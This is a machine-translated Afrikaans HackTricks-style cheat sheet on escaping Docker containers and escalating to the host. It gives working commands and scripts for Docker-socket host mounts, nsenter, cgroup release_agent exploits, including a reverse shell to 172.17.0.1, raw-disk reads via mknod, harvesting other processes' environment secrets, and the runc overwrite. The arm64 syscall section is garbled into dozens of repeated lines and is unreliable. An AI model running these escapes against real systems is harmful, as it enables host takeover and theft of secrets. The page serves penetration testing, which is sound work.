# Docker Uitbreek / Voorregverhoging

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **outomatiseer werkstrome** aangedryf deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
Kry Vandaag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Outomatiese Opsomming & Ontsnapping

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Dit kan ook **houders opsom**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Hierdie instrument is redelik **nuttig om die houer waarin jy is te opsom en selfs probeer om outomaties te ontsnap**
* [**amicontained**](https://github.com/genuinetools/amicontained): Nuttige instrument om die voorregte te kry wat die houer het om maniere te vind om daaruit te ontsnap
* [**deepce**](https://github.com/stealthcopter/deepce): Instrument om houers te opsom en daaruit te ontsnap
* [**grype**](https://github.com/anchore/grype): Kry die CVE's wat in die sagteware geïnstalleer in die beeld bevat

## Gemonteerde Docker Sokkel Ontsnapping

As jy op een of ander manier vind dat die **docker sokkel berge** binne die docker houer, sal jy daaruit kan ontsnap.\
Dit gebeur gewoonlik in docker-houers wat om een ​​of ander rede moet koppel aan die docker daemon om aksies uit te voer.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
In hierdie geval kan jy gewone docker-opdragte gebruik om met die docker-daemon te kommunikeer:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
In geval die **docker sokket op 'n onverwagte plek** is, kan jy steeds daarmee kommunikeer deur die **`docker`** bevel te gebruik met die parameter **`-H unix:///path/to/docker.sock`**
{% endhint %}

Docker daemon mag ook [luister op 'n poort (standaard 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) of op Systemd-gebaseerde stelsels, kan kommunikasie met die Docker daemon plaasvind oor die Systemd sokket `fd://`.

{% hint style="info" %}
Daarbenewens, let op die uitvoeringsokkels van ander hoëvlak-uitvoeringsomgewings:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities Misbruik Ontsnapping

Jy moet die kapasiteite van die houer nagaan, as dit enige van die volgende het, kan jy dalk daaruit ontsnap: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Jy kan tans die kapasiteite van die houer nagaan deur die **voorheen genoemde outomatiese gereedskap** of:
```bash
capsh --print
```
Op die volgende bladsy kan jy **meer leer oor Linux-vermoëns** en hoe om dit te misbruik om voorregte te ontsnap/te verhoog:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Ontsnapping uit Bevoorregte Houers

'n Bevoorregte houer kan geskep word met die vlag `--privileged` of deur spesifieke verdedigings uit te skakel:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Die `--privileged` vlag verlaag houer-sekuriteit aansienlik, deur **onbeperkte toesteltoegang** te bied en **veral beskermingslae te omseil**. Vir 'n gedetailleerde ontleding, verwys na die dokumentasie oor die volle impakte van `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Bevoorregte + hostPID

Met hierdie toestemmings kan jy net **beweeg na die namespace van 'n proses wat op die gasheer as root hardloop** soos init (pid:1) deur net te hardloop: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Toets dit in 'n houer deur uit te voer:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Bevoorreg

Net met die bevoorregte vlag kan jy probeer om **toegang tot die gasheer se skyf** te kry of probeer om **ontsnapping te misbruik deur release\_agent of ander ontsnappings**.

Toets die volgende omleidings in 'n houer uit te voer:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Monteer Disk - Poc1

Goed geconfigureerde docker-houers sal nie opdragte soos **fdisk -l** toelaat nie. Tog, op 'n verkeerd gekonfigureerde docker-opdrag waar die vlag `--privileged` of `--device=/dev/sda1` met kapitaliseerders gespesifiseer is, is dit moontlik om die regte te kry om die gas-aandrywing te sien.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Dus, om die gasmasjien oor te neem, is dit triviaal:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
En voilà! Jy kan nou toegang kry tot die lêersisteem van die gasheer omdat dit in die `/mnt/hola`-vouer gemoniteer is.

#### Montering van Skyf - Poc2

Binne die houer kan 'n aanvaller probeer om verdere toegang tot die onderliggende gasheer-OS te verkry deur 'n skryfbare hostPath-volume wat deur die groep geskep is. Hieronder is 'n paar algemene dinge wat jy binne die houer kan nagaan om te sien of jy hierdie aanvallervektor kan benut:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Bevoorregte Ontsnapping deur gebruik te maak van bestaande release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Aanvanklike PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Bevoorregte Ontsnapping deur die skepping van release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Tweede PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Vind 'n **verduideliking van die tegniek** in:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Bevoorregte Ontsnapping deur die release\_agent te misbruik sonder om die relatiewe pad te ken - PoC3

In die vorige aanvalle is die **absoluite pad van die houer binne die gasheer se lêersisteem bekendgemaak**. Dit is egter nie altyd die geval nie. In gevalle waar jy **nie die absoluite pad van die houer binne die gasheer ken nie** kan jy hierdie tegniek gebruik:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Die uitvoering van die PoC binne 'n bevoorregte houer behoort uitset te lewer soortgelyk aan:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Bevoorregte Ontsnapping deur Misbruik van Sensitiewe Monteerplekke

Daar is verskeie lêers wat gemonteer kan word wat **inligting oor die onderliggende gasheer** gee. Sommige van hulle kan selfs **aandui dat iets deur die gasheer uitgevoer moet word wanneer iets gebeur** (wat 'n aanvaller in staat sal stel om uit die houer te ontsnap). Die misbruik van hierdie lêers mag toelaat dat:

* release\_agent (reeds behandel voorheen)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Nietemin, kan jy **ander sensitiewe lêers** vind om te kontroleer op hierdie bladsy:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Willekeurige Monteerplekke

In verskeie gevalle sal jy vind dat die **houer 'n volume gemonteer het vanaf die gasheer**. As hierdie volume nie korrek geconfigureer is nie, kan jy dalk in staat wees om **toegang te verkry/wysig tot sensitiewe data**: Lees geheime, verander ssh authorized\_keys...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Voorregverhoging met 2 doppe en gasheerberg

As jy toegang het as **root binne 'n houer** wat 'n paar vouers van die gasheerberg gemonteer het en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer** en het leestoegang oor die gemonteerde vouer.\
Jy kan 'n **bash suid-lêer** skep in die **gemonteerde vouer** binne die **houer** en dit vanaf die gasheer **uitvoer** vir voorregverhoging.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Voorregskaping met 2 doppe

As jy toegang het as **root binne 'n houer** en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer**, kan jy beide doppe misbruik om **voorregskaping binne die gasheer** te bewerkstellig as jy die vermoë MKNOD binne die houer het (dit is standaard) soos [**verduidelik in hierdie pos**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Met so 'n vermoë word die root-gebruiker binne die houer toegelaat om **bloktoestel-lêers te skep**. Toestellêers is spesiale lêers wat gebruik word om **onderliggende hardeware & kernelmodules te benader**. Byvoorbeeld, die /dev/sda bloktoestel-lêer gee toegang om **die rou data op die stelsel se skyf te lees**.

Docker beskerm teen misbruik van bloktoestelle binne houers deur 'n cgroup-beleid af te dwing wat **bloktoestel lees/skryf-operasies blokkeer**. Nietemin, as 'n bloktoestel binne die houer **geskep word**, word dit toeganklik van buite die houer via die **/proc/PID/root/**-gids. Hierdie toegang vereis dat die **proses-eienaar dieselfde is** binne en buite die houer.

**Uitbuiting** voorbeeld van hierdie [**verslag**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

As jy toegang het tot die prosesse van die gasheer, sal jy in staat wees om baie sensitiewe inligting wat in daardie prosesse gestoor word, te benader. Voer toets laboratorium uit:
```
docker run --rm -it --pid=host ubuntu bash
```
Byvoorbeeld, jy sal in staat wees om die prosesse te lys deur iets soos `ps auxn` te gebruik en te soek na sensitiewe besonderhede in die opdragte.

Dan, aangesien jy **toegang het tot elke proses van die gasheer in /proc/, kan jy net hul omgewingsgeheime steel** deur die volgende uit te voer:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Jy kan ook **toegang verkry tot ander prosesse se lêerbeskrywers en hul oop lêers lees**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Jy kan ook **prosesse doodmaak en 'n DoS veroorsaak**.

{% hint style="warning" %}
As jy op een of ander manier bevoorregte **toegang oor 'n proses buite die houer** het, kan jy iets soos `nsenter --target <pid> --all` of `nsenter --target <pid> --mount --net --pid --cgroup` hardloop om **'n skaal met dieselfde ns-beperkings** (hopelik geen) **as daardie proses** te hardloop.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Indien 'n houer ingestel is met die Docker [gasnetwerkbestuurder (`--network=host`)](https://docs.docker.com/network/host/), is daardie houer se netwerkstapel nie geïsoleer van die Docker-gashouer nie (die houer deel die gas se netwerk-namespace), en die houer kry nie sy eie IP-adres toegewys nie. Met ander woorde, **bind die houer alle dienste direk aan die gas se IP**. Verder kan die houer **ALLE netwerkverkeer wat die gas** stuur en ontvang op die gedeelde koppelvlak onderskep met `tcpdump -i eth0`.

Byvoorbeeld, jy kan dit gebruik om verkeer tussen die gas en metadata-instansie te **sniff en selfs te spoof**.

Soos in die volgende voorbeelde:

* [Verslag: Hoe om Google SRE te kontak: 'n Skulping in die wolk SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata-diens MITM maak wortelprivilege-escalatie moontlik (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Jy sal ook in staat wees om **netwerkdienste wat aan die plaaslike gas gebind is** binne die gas te bereik of selfs die **metadata-toestemmings van die node** te bereik (wat dalk anders as dié is wat 'n houer kan bereik).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Met `hostIPC=true`, verkry jy toegang tot die inter-process kommunikasie (IPC) bronne van die gasheer, soos **gedeelde geheue** in `/dev/shm`. Dit maak dit moontlik om te lees/skryf waar dieselfde IPC-bronne deur ander gasheer- of houerprosesse gebruik word. Gebruik `ipcs` om hierdie IPC-meganismes verder te ondersoek.

* **Ondersoek /dev/shm** - Soek na enige lêers in hierdie gedeelde geheue-plek: `ls -la /dev/shm`
* **Ondersoek bestaande IPC-fasiliteite** - Jy kan nagaan of enige IPC-fasiliteite gebruik word met `/usr/bin/ipcs`. Kontroleer dit met: `ipcs -a`

### Herstel vaardighede

As die systaalaanroep **`unshare`** nie verbied is nie, kan jy al die vaardighede herwin deur die volgende uit te voer:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Gebruikersnaamruimte misbruik via symboliese koppeling

Die tweede tegniek wat in die pos [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) verduidelik word, dui aan hoe jy bindkoppeling met gebruikersnaamruimtes kan misbruik om lêers binne die gasheer te beïnvloed (in daardie spesifieke geval, lêers te verwyder).

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome te bou en outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
Kry Vandaag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE's

### Runc uitbuiting (CVE-2019-5736)

In geval jy `docker exec` as root kan uitvoer (waarskynlik met sudo), kan jy probeer om voorregte te eskaleer deur te ontsnap uit 'n houer deur misbruik te maak van CVE-2019-5736 (uitbuiting [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Hierdie tegniek sal basies die _**/bin/sh**_ binêre lêer van die **gasheer** **oorvryf vanuit 'n houer**, sodat enigeen wat docker exec uitvoer die lading kan aktiveer.

Verander die lading dienooreenkomstig en bou die main.go met `go build main.go`. Die resulterende binêre lêer moet in die docker houer geplaas word vir uitvoering.\
Met uitvoering, sodra dit `[+] Oorvryf /bin/sh suksesvol` vertoon, moet jy die volgende vanaf die gasheer-rekenaar uitvoer:

`docker exec -it <houer-naam> /bin/sh`

Dit sal die lading aktiveer wat teenwoordig is in die main.go lêer.

Vir meer inligting: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Daar is ander CVE's waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Docker Aangepaste Ontsnapping

### Docker Ontsnappingsoppervlak

* **Naamruimtes:** Die proses moet **heeltemal geskei wees van ander prosesse** via naamruimtes, sodat ons nie kan ontsnap om met ander prosesse te interaksieer as gevolg van naamruimtes (standaard kan nie kommunikeer via IPC's, Unix-sockets, netwerkdienste, D-Bus, `/proc` van ander prosesse).
* **Root-gebruiker**: Standaard is die gebruiker wat die proses hardloop die root-gebruiker (tans is sy voorregte beperk).
* **Bevoegdhede**: Docker laat die volgende bevoegdhede oor: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Dit is die syscalls wat die **root-gebruiker nie sal kan aanroep nie** (wegens 'n gebrek aan bevoegdhede + Seccomp). Die ander syscalls kan gebruik word om te probeer ontsnap.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %}  
### arm64-syscalls

Hierdie is 'n lys van arm64 syscalls wat gebruik kan word vir priviligie-escalation in Docker.  
Die volgende syscalls kan gebruik word om 'n privilege escalation aanval uit te voer:

- `sys_socket`
- `sys_connect`
- `sys_sendto`
- `sys_recvfrom`
- `sys_mmap`
- `sys_open`
- `sys_read`
- `sys_write`
- `sys_close`
- `sys_execve`
- `sys_dup`
- `sys_dup2`
- `sys_pipe`
- `sys_mprotect`
- `sys_fork`
- `sys_vfork`
- `sys_clone`
- `sys_ptrace`
- `sys_ptrace`
- `sys_prctl`
- `sys_arch_prctl`
- `sys_chroot`
- `sys_setuid`
- `sys_setgid`
- `sys_setreuid`
- `sys_setregid`
- `sys_setresuid`
- `sys_setresgid`
- `sys_setfsuid`
- `sys_setfsgid`
- `sys_setgroups`
- `sys_setsid`
- `sys_setpgid`
- `sys_setpriority`
- `sys_sched_setparam`
- `sys_sched_setscheduler`
- `sys_sched_setattr`
- `sys_sched_setaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getparam`
- `sys_sched_getscheduler`
- `sys_sched_getattr`
- `sys_sched_yield`
- `sys_sched_get_priority_max`
- `sys_sched_get_priority_min`
- `sys_sched_rr_get_interval`
- `sys_sched_getaffinity`
- `sys_sched_setaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
